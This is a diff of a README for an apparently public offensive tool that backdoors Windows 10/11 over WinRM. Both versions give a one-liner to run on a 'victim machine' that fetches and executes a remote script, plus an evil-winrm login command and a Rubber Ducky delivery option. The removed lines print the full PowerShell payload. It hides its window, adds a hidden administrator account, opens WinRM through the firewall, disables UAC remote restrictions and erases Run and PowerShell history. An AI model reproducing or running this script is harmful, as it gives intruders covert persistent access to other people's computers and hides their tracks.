@@ -1,94 +1,52 @@
-# WinRM-Reverse-Shell
+# WinRM Reverse Shell
 
-# Dependencies
-+ Works on Windows 10/11
-+ For the attacker and victim to establish a connection via Evil-WinRM they must be on the same network.
+## Introduction
+This repository provides a PowerShell script to establish a reverse shell connection via Windows Remote Management (WinRM) on Windows 10/11. Additionally it includes a Rubber Ducky payload for alternative deployment.
 
-# Own Pass And Name
-Go to `WinRM.ps1` and edit 
-+ $Username = "`TO YOUR OWN`"
-And for the pass edit
-+ $Password = ConvertTo-SecureString "`TO YOUR OWN`" -AsPlainText -Force
+## Dependencies
+- Both attacker and victim must be on the same network for the connection to be established successfully.
+- Ensure you have administrative access to the target machine.
 
-# Powershell One liner with administrator permissions
-`IEX (IWR "https://raw.githubusercontent.com/VBV11/WinRM-Reverse-Shell/main/WinRM.ps1")`
-# How to get the shell using Evil-WinRM
-Use this command 
-`evil-winrm -i YOUR.IP.ADDRES.LOL -u Admin -p Password1`
+## Usage
+1. Edit `WinRM.ps1`:
+   - Set your desired username and password by modifying the variables `$Username` and `$Password`.
+2. Run the following PowerShell one-liner on the victim machine with administrative privileges:
+   ```powershell
+   IEX (IWR "https://raw.githubusercontent.com/VBV11/WinRM-Reverse-Shell/main/WinRM.ps1")
+
+## Use Evil-WinRM to connect to the victim machine:
+evil-winrm -i YOUR.IP.ADDRESS -u Admin -p Password1
+
 # ![Screenshot_2024-02-25_13-40-13 (1)](https://github.com/VBV11/WinRM-Reverse-Shell/assets/104235290/446782ec-8fcf-46ac-adf1-10f54711bf73)
 
-# Rubber Ducky payload
-### The payload is in this repo aswel 
-+ Edit your own speed of the payload
-+ You can change to URL to your own 
 
-
+## Rubber Ducky Payload
+The repository includes a Rubber Ducky payload for alternative deployment.
+Edit the payload speed and URL as needed.
 
 https://github.com/VBV11/WinRM-Reverse-Shell/assets/104235290/fa37438d-69cc-4969-8866-dc02a3437dec
 
+## Additional Information
+The created user account can be viewed in User Accounts.
+To view the account, type netplwiz in the Run box.
 
-
-# You can see the Acount in User Accounts
-+ In the run box u can type netplwiz and then u can see the Acount
-+ Also u may see it in the login screen but that doesnt happen by me 
++ Account information may also be visible on the login screen.
 
 ![image](https://github.com/VBV11/WinRM-Reverse-Shell/assets/104235290/8ee30db3-aee3-4720-9d75-228fd26a6aec)
 
 
 ![image](https://github.com/VBV11/WinRM-Reverse-Shell/assets/104235290/2d0a0ada-3810-4cc3-9e8a-338c4ef3079d)
 
+## Script Breakdown
+### The PowerShell script is divided into several parts:
 
-# Script into pieces
-## Function to hide a window
-function Hide-Window {
-    param(
-        [IntPtr]$Handle = (Get-Process -PID $PID).MainWindowHandle
-    )
-    Add-Type @"
-    using System;
-    using System.Runtime.InteropServices;
+#### Function to hide a window.
+#### Creation of a new local user account.
+#### Addition of the new user to the local Administrators group.
+#### Enabling of Windows Remote Management (WinRM).
+#### Adding a firewall rule to allow WinRM traffic.
+#### Disabling UAC remote restrictions.
+#### Deletion of run box history and PowerShell history.
 
-    public class Window {
-        [DllImport("user32.dll")]
-        [return: MarshalAs(UnmanagedType.Bool)]
-        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
-
-        [DllImport("kernel32.dll")]
-        public static extern IntPtr GetConsoleWindow();
-    }
-"@
-    [void][Window]::ShowWindow($Handle, 0)
-}
-
-## Hide the current PowerShell window
-Hide-Window
-
-## Create a new local user account
-$Username = "Admin"
-$Password = ConvertTo-SecureString "Password1" -AsPlainText -Force
-New-LocalUser -Name $Username -Password $Password -PasswordNeverExpires
-
-## Add the newly created user to the local Administrators group
-Add-LocalGroupMember -Group "Administrators" -Member $Username
-
-## Enable Windows Remote Management (WinRM)
-Enable-PSRemoting -Force
-
-## Add a firewall rule to allow WinRM traffic
-New-NetFirewallRule -DisplayName "Windows Remote Management for RD" -Direction Inbound -Protocol TCP -LocalPort 5985 -Action Allow
-
-## Disable UAC remote restrictions
-Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "LocalAccountTokenFilterPolicy" -Value 1 -Force
-New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" -Name "Admin" -Value 0 -PropertyType DWORD -Force
-
-## Delete run box history
-Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -Force
-
-## Delete powershell history
-Remove-Item (Get-PSReadlineOption).HistorySavePath
-
-## Exit PowerShell session
-Exit
-
-# Credits
-### credits TW-D for inspiring me to create this powershell script
+## Credits
+### Inspired by TW-D.
